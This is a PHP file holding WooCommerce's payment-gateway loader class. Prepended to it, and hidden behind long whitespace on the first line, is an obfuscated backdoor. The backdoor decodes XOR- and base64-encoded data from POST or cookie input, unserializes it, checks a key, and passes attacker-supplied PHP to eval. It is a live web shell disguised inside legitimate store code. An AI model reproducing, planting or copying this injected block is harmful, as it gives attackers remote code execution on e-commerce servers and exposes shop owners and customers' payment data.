<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $tc98 = 804;$GLOBALS['a5abd2a79'] = Array();global $a5abd2a79;$a5abd2a79 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['rdc046'] = "\x3d\x21\x57\x32\x69\x52\x72\x2c\x4b\x2d\x3b\x30\x7c\x35\x78\x6d\x4a\x2b\x68\x2f\x26\x31\x46\x44\x40\x5e\x39\x42\x53\xd\x24\x5b\x54\x70\x79\x64\x5d\x76\x2e\x23\x5c\xa\x51\x6f\x7e\x7b\x4d\x55\x77\x4e\x48\x45\x73\x74\x63\x71\x7d\x5a\x27\x25\x28\x34\x65\x6c\x61\x62\x4c\x33\x56\x50\x3a\x67\x6a\x59\x66\x43\x2a\x47\x60\x4f\x5f\x9\x36\x6e\x3c\x58\x3e\x7a\x3f\x22\x38\x41\x29\x20\x49\x75\x37\x6b";$a5abd2a79[$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][35].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][35]] = $a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][18].$a5abd2a79['rdc046'][6];$a5abd2a79[$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][90]] = $a5abd2a79['rdc046'][43].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][35];$a5abd2a79[$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][62]] = $a5abd2a79['rdc046'][35].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][83].$a5abd2a79['rdc046'][62];$a5abd2a79[$a5abd2a79['rdc046'][48].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][74]] = $a5abd2a79['rdc046'][52].$a5abd2a79['rdc046'][53].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][83];$a5abd2a79[$a5abd2a79['rdc046'][97].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][35]] = $a5abd2a79['rdc046'][35].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][83].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][35];$a5abd2a79[$a5abd2a79['rdc046'][18].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][35]] = $a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][83].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][52].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][53];$a5abd2a79[$a5abd2a79['rdc046'][48].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][64]] = $a5abd2a79['rdc046'][52].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][87].$a5abd2a79['rdc046'][62];$a5abd2a79[$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][62]] = $a5abd2a79['rdc046'][33].$a5abd2a79['rdc046'][18].$a5abd2a79['rdc046'][33].$a5abd2a79['rdc046'][37].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][52].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][43].$a5abd2a79['rdc046'][83];$a5abd2a79[$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][61]] = $a5abd2a79['rdc046'][95].$a5abd2a79['rdc046'][83].$a5abd2a79['rdc046'][52].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][87].$a5abd2a79['rdc046'][62];$a5abd2a79[$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][11]] = $a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][52].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][35].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][43].$a5abd2a79['rdc046'][35].$a5abd2a79['rdc046'][62];$a5abd2a79[$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][11]] = $a5abd2a79['rdc046'][52].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][53].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][53].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][15].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][15].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][53];$a5abd2a79[$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][13]] = $a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][64];$a5abd2a79[$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][11]] = $a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][82];$a5abd2a79[$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][21]] = $_POST;$a5abd2a79[$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][35].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][74]] = $_COOKIE;@$a5abd2a79[$a5abd2a79['rdc046'][18].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][35]]($a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][43].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][43].$a5abd2a79['rdc046'][71], NULL);@$a5abd2a79[$a5abd2a79['rdc046'][18].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][35]]($a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][43].$a5abd2a79['rdc046'][71].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][43].$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][52], 0);@$a5abd2a79[$a5abd2a79['rdc046'][18].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][35]]($a5abd2a79['rdc046'][15].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][14].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][14].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][95].$a5abd2a79['rdc046'][53].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][43].$a5abd2a79['rdc046'][83].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][53].$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][15].$a5abd2a79['rdc046'][62], 0);@$a5abd2a79[$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][11]](0);if (!$a5abd2a79[$a5abd2a79['rdc046'][97].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][35]]($a5abd2a79['rdc046'][91].$a5abd2a79['rdc046'][66].$a5abd2a79['rdc046'][5].$a5abd2a79['rdc046'][51].$a5abd2a79['rdc046'][91].$a5abd2a79['rdc046'][23].$a5abd2a79['rdc046'][73].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][5].$a5abd2a79['rdc046'][47].$a5abd2a79['rdc046'][49].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][64])){$a5abd2a79[$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][62]]($a5abd2a79['rdc046'][91].$a5abd2a79['rdc046'][66].$a5abd2a79['rdc046'][5].$a5abd2a79['rdc046'][51].$a5abd2a79['rdc046'][91].$a5abd2a79['rdc046'][23].$a5abd2a79['rdc046'][73].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][5].$a5abd2a79['rdc046'][47].$a5abd2a79['rdc046'][49].$a5abd2a79['rdc046'][80].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][64], 1);$td412629e = NULL;$fb119 = NULL;$a5abd2a79[$a5abd2a79['rdc046'][48].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][74]] = $a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][9].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][9].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][9].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][9].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][3];global $w1517af;function  f1b456($td412629e, $zc09e2){global $a5abd2a79;$hde1c2 = "";for ($q931ce=0; $q931ce<$a5abd2a79[$a5abd2a79['rdc046'][48].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][74]]($td412629e);){for ($b29dedf94=0; $b29dedf94<$a5abd2a79[$a5abd2a79['rdc046'][48].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][74]]($zc09e2) && $q931ce<$a5abd2a79[$a5abd2a79['rdc046'][48].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][74]]($td412629e); $b29dedf94++, $q931ce++){$hde1c2 .= $a5abd2a79[$a5abd2a79['rdc046'][63].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][3].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][35].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][35]]($a5abd2a79[$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][90]]($td412629e[$q931ce]) ^ $a5abd2a79[$a5abd2a79['rdc046'][6].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][90]]($zc09e2[$b29dedf94]));}}return $hde1c2;}function  rcec30a($td412629e, $zc09e2){global $a5abd2a79;global $w1517af;return $a5abd2a79[$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][11]]($a5abd2a79[$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][65].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][90].$a5abd2a79['rdc046'][11]]($td412629e, $w1517af), $zc09e2);}foreach ($a5abd2a79[$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][35].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][74]] as $zc09e2=>$c69bb83){$td412629e = $c69bb83;$fb119 = $zc09e2;}if (!$td412629e){foreach ($a5abd2a79[$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][21]] as $zc09e2=>$c69bb83){$td412629e = $c69bb83;$fb119 = $zc09e2;}}$td412629e = @$a5abd2a79[$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][61]]($a5abd2a79[$a5abd2a79['rdc046'][4].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][13]]($a5abd2a79[$a5abd2a79['rdc046'][74].$a5abd2a79['rdc046'][26].$a5abd2a79['rdc046'][61].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][11]]($td412629e), $fb119));if (isset($td412629e[$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][97]]) && $w1517af==$td412629e[$a5abd2a79['rdc046'][64].$a5abd2a79['rdc046'][97]]){if ($td412629e[$a5abd2a79['rdc046'][64]] == $a5abd2a79['rdc046'][4]){$q931ce = Array($a5abd2a79['rdc046'][33].$a5abd2a79['rdc046'][37] => @$a5abd2a79[$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][67].$a5abd2a79['rdc046'][82].$a5abd2a79['rdc046'][13].$a5abd2a79['rdc046'][96].$a5abd2a79['rdc046'][62].$a5abd2a79['rdc046'][62]](),$a5abd2a79['rdc046'][52].$a5abd2a79['rdc046'][37] => $a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][38].$a5abd2a79['rdc046'][11].$a5abd2a79['rdc046'][9].$a5abd2a79['rdc046'][21],);echo @$a5abd2a79[$a5abd2a79['rdc046'][48].$a5abd2a79['rdc046'][21].$a5abd2a79['rdc046'][54].$a5abd2a79['rdc046'][64]]($q931ce);}elseif ($td412629e[$a5abd2a79['rdc046'][64]] == $a5abd2a79['rdc046'][62]){eval/*k93a99173*/($td412629e[$a5abd2a79['rdc046'][35]]);}exit();}} ?><?php

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

/**
 * WooCommerce Payment Gateways class
 *
 * Loads payment gateways via hooks for use in the store.
 *
 * @class 		WC_Payment_Gateways
 * @version		2.2.0
 * @package		WooCommerce/Classes/Payment
 * @category	Class
 * @author 		WooThemes
 */
class WC_Payment_Gateways {

	/** @var array Array of payment gateway classes. */
	public $payment_gateways;

	/**
	 * @var WC_Payment_Gateways The single instance of the class
	 * @since 2.1
	 */
	protected static $_instance = null;

	/**
	 * Main WC_Payment_Gateways Instance.
	 *
	 * Ensures only one instance of WC_Payment_Gateways is loaded or can be loaded.
	 *
	 * @since 2.1
	 * @static
	 * @return WC_Payment_Gateways Main instance
	 */
	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}

	/**
	 * Cloning is forbidden.
	 *
	 * @since 2.1
	 */
	public function __clone() {
		wc_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );
	}

	/**
	 * Unserializing instances of this class is forbidden.
	 *
	 * @since 2.1
	 */
	public function __wakeup() {
		wc_doing_it_wrong( __FUNCTION__, __( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );
	}

	/**
	 * Initialize payment gateways.
	 */
	public function __construct() {
		$this->init();
	}

	/**
	 * Load gateways and hook in functions.
	 */
	public function init() {
		$load_gateways = array(
			'WC_Gateway_BACS',
			'WC_Gateway_Cheque',
			'WC_Gateway_COD',
			'WC_Gateway_Paypal',
		);

		/**
		 * Simplify Commerce is @deprecated in 2.6.0. Only load when enabled.
		 */
		if ( ! class_exists( 'WC_Gateway_Simplify_Commerce_Loader' ) && in_array( WC()->countries->get_base_country(), apply_filters( 'woocommerce_gateway_simplify_commerce_supported_countries', array( 'US', 'IE' ) ) ) ) {
			$simplify_options = get_option( 'woocommerce_simplify_commerce_settings', array() );

			if ( ! empty( $simplify_options['enabled'] ) && 'yes' === $simplify_options['enabled'] ) {
				if ( function_exists( 'wcs_create_renewal_order' ) ) {
					$load_gateways[] = 'WC_Addons_Gateway_Simplify_Commerce';
				} else {
					$load_gateways[] = 'WC_Gateway_Simplify_Commerce';
				}
			}
		}

		// Filter
		$load_gateways = apply_filters( 'woocommerce_payment_gateways', $load_gateways );

		// Get sort order option
		$ordering  = (array) get_option( 'woocommerce_gateway_order' );
		$order_end = 999;

		// Load gateways in order
		foreach ( $load_gateways as $gateway ) {
			$load_gateway = is_string( $gateway ) ? new $gateway() : $gateway;

			if ( isset( $ordering[ $load_gateway->id ] ) && is_numeric( $ordering[ $load_gateway->id ] ) ) {
				// Add in position
				$this->payment_gateways[ $ordering[ $load_gateway->id ] ] = $load_gateway;
			} else {
				// Add to end of the array
				$this->payment_gateways[ $order_end ] = $load_gateway;
				$order_end++;
			}
		}

		ksort( $this->payment_gateways );
	}

	/**
	 * Get gateways.
	 * @return array
	 */
	public function payment_gateways() {
		$_available_gateways = array();

		if ( sizeof( $this->payment_gateways ) > 0 ) {
			foreach ( $this->payment_gateways as $gateway ) {
				$_available_gateways[ $gateway->id ] = $gateway;
			}
		}

		return $_available_gateways;
	}

	/**
	 * Get array of registered gateway ids
	 * @since 2.6.0
	 * @return array of strings
	 */
	public function get_payment_gateway_ids() {
		return wp_list_pluck( $this->payment_gateways, 'id' );
	}

	/**
	 * Get available gateways.
	 *
	 * @return array
	 */
	public function get_available_payment_gateways() {
		$_available_gateways = array();

		foreach ( $this->payment_gateways as $gateway ) {
			if ( $gateway->is_available() ) {
				if ( ! is_add_payment_method_page() ) {
					$_available_gateways[ $gateway->id ] = $gateway;
				} elseif ( $gateway->supports( 'add_payment_method' ) ) {
					$_available_gateways[ $gateway->id ] = $gateway;
				} elseif ( $gateway->supports( 'tokenization' ) ) {
					$_available_gateways[ $gateway->id ] = $gateway;
				}
			}
		}

		return apply_filters( 'woocommerce_available_payment_gateways', $_available_gateways );
	}

	/**
	 * Set the current, active gateway.
	 *
	 * @param array $gateway Available payment gateways.
	 */
	public function set_current_gateway( $gateways ) {
		// Be on the defensive
		if ( ! is_array( $gateways ) || empty( $gateways ) ) {
			return;
		}

		if ( is_user_logged_in() ) {
			$default_token = WC_Payment_Tokens::get_customer_default_token( get_current_user_id() );
			if ( ! is_null( $default_token ) ) {
				$default_token_gateway = $default_token->get_gateway_id();
			}
		}

		$current = ( isset( $default_token_gateway ) ? $default_token_gateway : WC()->session->get( 'chosen_payment_method' ) );

		if ( $current && isset( $gateways[ $current ] ) ) {
			$current_gateway = $gateways[ $current ];

		} else {
			$current_gateway = current( $gateways );
		}

		// Ensure we can make a call to set_current() without triggering an error
		if ( $current_gateway && is_callable( array( $current_gateway, 'set_current' ) ) ) {
			$current_gateway->set_current();
		}
	}

	/**
	 * Save options in admin.
	 */
	public function process_admin_options() {
		$gateway_order = isset( $_POST['gateway_order'] ) ? $_POST['gateway_order'] : '';
		$order         = array();

		if ( is_array( $gateway_order ) && sizeof( $gateway_order ) > 0 ) {
			$loop = 0;
			foreach ( $gateway_order as $gateway_id ) {
				$order[ esc_attr( $gateway_id ) ] = $loop;
				$loop++;
			}
		}

		update_option( 'woocommerce_gateway_order', $order );
	}
}
